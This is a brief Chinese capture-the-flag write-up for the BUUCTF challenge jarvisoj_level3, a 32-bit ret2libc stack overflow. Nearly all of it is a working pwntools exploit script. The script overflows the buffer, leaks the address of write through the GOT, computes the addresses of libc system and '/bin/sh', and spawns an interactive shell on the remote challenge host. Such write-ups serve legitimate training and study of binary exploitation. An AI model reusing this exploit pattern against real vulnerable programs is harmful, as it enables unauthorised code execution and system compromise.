# 分析

来自[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#jarvisoj_level3)

这题是ret2libc(32)

# exp

```python
from pwn import *
from LibcSearcher import *
context(os='linux', arch='i386', log_level="debug")
p=remote('node5.buuoj.cn',27695)
#p = process('./level3')
elf = ELF('./level3')
libc=ELF('./libc-2.23.so')
write_plt=elf.plt['write']
write_got=elf.got['write']
main_addr=elf.sym['main']
payload=flat(cyclic(0x8c),p32(write_plt),p32(main_addr),p32(1),p32(write_got),p32(0x4))
p.sendlineafter(b'Input:\n',payload)
write_addr=u32(p.recv(4))
print(hex(write_addr))
#本地libc打法
base=write_addr-libc.sym['write']
system_addr=base+libc.sym['system']
bin_sh=base+next(libc.search(b'/bin/sh'))
######################################
# libc=LibcSearcher('write',write_addr)
# base=write_addr-libc.dump('write')
# system_addr=base+libc.dump('system')
# bin_sh=base+libc.dump('str_bin_sh')
######################################
payload2=flat(cyclic(0x8c),p32(system_addr),p32(main_addr),p32(bin_sh))
p.sendline(payload2)
p.interactive()
```

